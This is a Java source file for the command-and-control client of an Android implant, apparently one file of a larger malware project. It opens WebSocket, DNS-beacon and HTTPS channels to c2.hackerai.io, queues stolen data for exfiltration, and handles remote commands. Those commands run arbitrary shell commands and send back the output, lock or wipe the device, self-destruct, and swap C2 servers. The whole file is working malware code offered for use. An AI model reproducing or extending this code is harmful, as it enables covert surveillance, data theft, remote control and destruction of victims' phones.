// ============================================================
// FILE 13: comms/ChannelClient.java
// ============================================================
package io.hackerai.implant.comms;

import android.content.Context;
import android.util.Log;

import org.json.JSONObject;

import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * ChannelClient — multi-channel C2 client manager.
 *
 * Supports 3 simultaneous outbound channels:
 *   1. WebSocket (primary, low-latency persistent)
 *   2. DNS Beacon (fallback, high-latency exfil via DNS queries)
 *   3. HTTPS polling (tertiary, periodic HTTP GET/POST)
 *
 * Messages are queued in a thread-safe blocking queue and
 * drained by all active channels.
 */
public class ChannelClient {
    private static final String TAG = "ChannelClient";

    // Singleton
    private static ChannelClient instance;
    private final Context ctx;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private final LinkedBlockingQueue<String> outbox = new LinkedBlockingQueue<>();

    // Channel instances
    private WSSClient wssClient;
    private DNSBeacon dnsBeacon;
    private HttpsPoller httpsPoller;

    // C2 configuration (set via C2 command or config)
    private String wssUrl = "wss://c2.hackerai.io/ws";
    private String dnsDomain = "c2.hackerai.io";
    private String httpsBase = "https://c2.hackerai.io/api";
    private String implantId;

    private ChannelClient(Context context) {
        this.ctx = context.getApplicationContext();
        this.implantId = generateImplantId();
    }

    public static synchronized ChannelClient getInstance(Context context) {
        if (instance == null) {
            instance = new ChannelClient(context.getApplicationContext());
        }
        return instance;
    }

    /** Start all C2 channels */
    public void start() {
        if (!running.compareAndSet(false, true)) return;
        Log.i(TAG, "Starting C2 channels...");

        wssClient = new WSSClient(ctx, wssUrl, implantId, outbox);
        wssClient.connect();

        dnsBeacon = new DNSBeacon(ctx, dnsDomain, implantId, outbox);
        dnsBeacon.start();

        httpsPoller = new HttpsPoller(ctx, httpsBase, implantId, outbox);
        httpsPoller.start();

        Log.i(TAG, "All C2 channels started.");
    }

    /** Stop all channels */
    public void stop() {
        if (!running.compareAndSet(true, false)) return;
        Log.i(TAG, "Stopping C2 channels...");
        if (wssClient != null) wssClient.disconnect();
        if (dnsBeacon != null) dnsBeacon.stop();
        if (httpsPoller != null) httpsPoller.stop();
        outbox.clear();
    }

    /** Enqueue a message for exfiltration */
    public static void sendExfil(String data) {
        if (instance == null) {
            Log.w(TAG, "ChannelClient not initialized.");
            return;
        }
        try {
            JSONObject envelope = new JSONObject();
            envelope.put("type", "exfil");
            envelope.put("data", data);
            envelope.put("ts", System.currentTimeMillis());
            envelope.put("id", instance.implantId);
            instance.outbox.put(envelope.toString());
        } catch (Exception e) {
            Log.e(TAG, "Enqueue failed", e);
        }
    }

    /** Send a heartbeat/liveness beacon */
    public static void sendHeartbeat() {
        if (instance == null) return;
        try {
            JSONObject hb = new JSONObject();
            hb.put("type", "hb");
            hb.put("ts", System.currentTimeMillis());
            hb.put("id", instance.implantId);
            instance.outbox.put(hb.toString());
        } catch (Exception ignored) {}
    }

    /** Process an incoming C2 command */
    public void processCommand(String rawJson) {
        try {
            JSONObject cmd = new JSONObject(rawJson);
            String action = cmd.optString("action", "");
            String payload = cmd.optString("payload", "");

            Log.d(TAG, "C2 command: " + action);

            switch (action) {
                case "exec":
                    // Execute shell command via ShellUtils
                    String result = io.hackerai.implant.utils.ShellUtils
                            .execute(payload);
                    sendExfil("exec_result:" + result);
                    break;

                case "lock":
                    io.hackerai.implant.persist.DeviceAdminHook dpm =
                            new io.hackerai.implant.persist.DeviceAdminHook(ctx);
                    dpm.lockNow();
                    break;

                case "wipe":
                    io.hackerai.implant.persist.DeviceAdminHook wipe =
                            new io.hackerai.implant.persist.DeviceAdminHook(ctx);
                    wipe.wipeDevice();
                    break;

                case "selfdestruct":
                    io.hackerai.implant.persist.PersistenceMatrix
                            .getInstance(ctx).disengage();
                    break;

                case "config":
                    updateConfig(cmd.optJSONObject("config"));
                    break;

                case "exfil":
                    // Treat incoming payload as additional exfil
                    sendExfil(payload);
                    break;

                default:
                    Log.w(TAG, "Unknown command: " + action);
            }
        } catch (Exception e) {
            Log.e(TAG, "Command parse error", e);
        }
    }

    private void updateConfig(JSONObject config) {
        if (config == null) return;
        if (config.has("wss_url"))
            this.wssUrl = config.optString("wss_url");
        if (config.has("dns_domain"))
            this.dnsDomain = config.optString("dns_domain");
        if (config.has("https_base"))
            this.httpsBase = config.optString("https_base");
        Log.i(TAG, "Config updated.");
    }

    private String generateImplantId() {
        return "AID-" + java.util.UUID.randomUUID().toString().substring(0, 8).toUpperCase();
    }

    public boolean isRunning() { return running.get(); }
    public String getImplantId() { return implantId; }
}
